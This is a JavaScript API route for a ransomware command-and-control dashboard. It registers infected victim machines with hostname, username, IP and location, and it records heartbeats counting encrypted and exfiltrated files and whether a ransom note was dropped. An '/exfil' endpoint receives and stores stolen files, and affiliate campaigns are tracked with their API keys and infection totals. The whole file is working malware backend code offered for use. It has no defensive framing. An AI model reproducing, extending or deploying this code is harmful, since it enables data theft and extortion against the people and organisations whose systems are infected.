// vercel-dashboard/api/v1/index.js
// API Version 1 - Legacy compatibility

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  response.setHeader('API-Version', '1.0');
  response.setHeader('API-Deprecated', 'true');
  response.setHeader('API-Sunset', '2025-12-31');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid) {
    return response.status(auth.status || 401).json({ error: auth.error });
  }

  // Route to v1 handlers
  const path = request.url.replace('/api/v1', '');
  
  try {
    switch (path) {
      case '/systems':
        return await handleSystemsV1(request, response, auth);
      case '/exfil':
        return await handleExfilV1(request, response, auth);
      case '/campaigns':
        return await handleCampaignsV1(request, response, auth);
      case '/stats':
        return await handleStatsV1(request, response, auth);
      default:
        return response.status(404).json({ error: 'Not found', version: '1.0' });
    }
  } catch (error) {
    console.error('API v1 error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// V1 Systems - simplified response format
async function handleSystemsV1(request, response, auth) {
  if (request.method === 'POST') {
    // Register system - v1 format
    const { victim_id, campaign_id, hostname, username, os, ip } = request.body;
    
    const systemId = `sys_${Buffer.from(victim_id).toString('base64url').substring(0, 32)}`;
    const now = new Date().toISOString();
    
    const system = {
      id: systemId,
      victim_id,
      campaign_id,
      hostname: hostname || 'Unknown',
      username: username || 'Unknown',
      os: os || 'Unknown',
      ip: ip || request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown',
      country: request.headers['x-vercel-ip-country'] || 'Unknown',
      city: request.headers['x-vercel-ip-city'] || 'Unknown',
      isp: request.headers['x-vercel-ip-isp'] || 'Unknown',
      status: 'active',
      first_seen: now,
      last_seen: now,
    };

    await kv.set(`system:${systemId}`, system);
    await kv.sadd('global:systems', systemId);
    await kv.sadd(`campaign:${campaign_id}:systems`, systemId);
    await kv.hset(`system:${systemId}:stats`, {
      files_encrypted: 0,
      files_exfiltrated: 0,
      bytes_exfiltrated: 0,
      ransom_note_dropped: false,
    });

    return response.json({ system_id: systemId, status: 'registered' });
  }

  if (request.method === 'PUT') {
    // Heartbeat - v1 format
    const { system_id, files_encrypted, files_exfiltrated, bytes_exfiltrated, status } = request.body;
    
    const existing = await kv.get(`system:${system_id}`);
    if (!existing) return response.status(404).json({ error: 'Not found' });

    const updated = {
      ...existing,
      status: status || existing.status,
      last_seen: new Date().toISOString(),
    };

    await kv.set(`system:${system_id}`, updated);
    
    if (files_encrypted !== undefined || files_exfiltrated !== undefined || bytes_exfiltrated !== undefined) {
      await kv.hincrby(`system:${system_id}:stats`, 'files_encrypted', files_encrypted || 0);
      await kv.hincrby(`system:${system_id}:stats`, 'files_exfiltrated', files_exfiltrated || 0);
      await kv.hincrby(`system:${system_id}:stats`, 'bytes_exfiltrated', bytes_exfiltrated || 0);
    }

    return response.json({ status: 'ok' });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

// V1 Exfiltration - simplified
async function handleExfilV1(request, response, auth) {
  if (request.method === 'POST') {
    const systemId = request.headers['x-system-id'];
    const fileName = request.headers['x-file-name'] || 'unknown';
    
    if (!systemId) return response.status(400).json({ error: 'Missing X-System-Id' });

    const chunks = [];
    for await (const chunk of request.body) chunks.push(chunk);
    const data = Buffer.concat(chunks);

    const fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const fileDataB64 = data.toString('base64');

    await kv.set(`file:${fileId}:data`, fileDataB64, { ex: 2592000 });
    await kv.set(`file:${fileId}:meta`, {
      id: fileId,
      system_id: systemId,
      file_name: fileName,
      size: data.length,
      uploaded_at: new Date().toISOString(),
    });
    await kv.sadd(`system:${systemId}:files`, fileId);

    await kv.hincrby(`system:${systemId}:stats`, 'files_exfiltrated', 1);
    await kv.hincrby(`system:${systemId}:stats`, 'bytes_exfiltrated', data.length);

    return response.json({ file_id: fileId, status: 'uploaded' });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

// V1 Campaigns
async function handleCampaignsV1(request, response, auth) {
  if (request.method === 'GET') {
    const campaignIds = await kv.smembers('global:campaigns') || [];
    const campaigns = [];

    for (const cid of campaignIds) {
      const c = await kv.get(`campaign:${cid}`);
      if (c && (auth.role === 'admin' || c.affiliateId === `aff_${auth.campaignId.replace('camp_', '')}`)) {
        campaigns.push({
          id: c.id,
          name: c.name,
          api_key: c.apiKey,
          status: c.status,
          created_at: c.createdAt,
        });
      }
    }

    return response.json({ campaigns });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

// V1 Stats
async function handleStatsV1(request, response, auth) {
  const campaignIds = auth.role === 'admin' 
    ? await kv.smembers('global:campaigns') || []
    : [auth.campaignId];

  let totalInfections = 0;
  let totalFiles = 0;
  let totalBytes = 0;

  for (const cid of campaignIds) {
    const stats = await kv.hgetall(`campaign:${cid}:stats`) || {};
    totalInfections += parseInt(stats.totalInfections || '0');
    totalFiles += parseInt(stats.totalFiles || '0');
    totalBytes += parseInt(stats.totalBytes || '0');
  }

  return response.json({
    total_infections: totalInfections,
    total_files: totalFiles,
    total_bytes: totalBytes,
    timestamp: new Date().toISOString(),
  });
}